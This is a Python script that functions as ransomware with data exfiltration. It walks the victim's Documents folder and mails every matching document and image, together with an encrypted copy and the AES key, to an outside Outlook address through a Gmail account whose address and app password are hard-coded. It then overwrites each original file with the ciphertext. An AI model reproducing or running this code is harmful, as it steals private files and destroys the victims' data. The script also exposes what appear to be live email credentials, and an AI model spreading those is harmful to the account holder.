# ====== L
import os, smtplib, base64, json
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend

# ========== C
EMAIL_MODE    = True
EMAIL_ADDRESS = "ahmedmoamen2200@gmail.com"
EMAIL_PASSWORD= "jkza qrun caur wpxw"
EMAIL_TARGET  = "recipienfk61@outlook.com"
SMTP_SERVER   = "smtp.gmail.com"
SMTP_PORT     = 587
TARGET_EXTS   = {'.txt', '.pdf', '.docx', '.jpg', '.png'}

# ========== O
def generate_aes_key():
    return os.urandom(32)  # 256-bit AES key

def encrypt_data(data, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    ct = encryptor.update(padded) + encryptor.finalize()
    return iv + ct, iv

def get_target_files():
    docs = os.path.join(os.path.expanduser("~"), "Documents")
    for root, _, files in os.walk(docs):
        for f in files:
            if os.path.splitext(f)[1].lower() in TARGET_EXTS:
                yield os.path.join(root, f)

def send_email_with_attachments(subject, attachments):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To']   = EMAIL_TARGET
    msg['Subject'] = subject
    for fname, fdata in attachments:
        part = MIMEBase('application','octet-stream')
        part.set_payload(fdata)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',f'attachment; filename="{fname}"')
        msg.attach(part)
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as srv:
        srv.starttls()
        srv.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        srv.send_message(msg)

# ========== M
def main():
    for path in get_target_files():
        filename = os.path.basename(path)
        with open(path, 'rb') as f: content = f.read()

        # -Encrypt
        aes_key = generate_aes_key()
        encrypted, iv = encrypt_data(content, aes_key)

        # -Prepare key info as JSON (in memory, no saving on disk)
        key_info = {
            "key_base64": base64.b64encode(aes_key).decode(),
            "iv_base64" : base64.b64encode(iv).decode(),
            "algo"      : "AES-CBC-256"
        }
        key_info_bytes = json.dumps(key_info, indent=2).encode()

        # -Send Email
        if EMAIL_MODE:
            attachments = [
                (filename, content),                # original
                (filename + ".enc", encrypted),     # encrypted
                ("key_info.txt", key_info_bytes)    # key info as attachment
            ]
            send_email_with_attachments(f"Backup & Encrypted - {filename}", attachments)

        # -Replace original with encrypted
        with open(path, 'wb') as f: f.write(encrypted)

        print(f"âœ… Processed & Encrypted: {filename}")

if __name__ == "__main__":
    main()
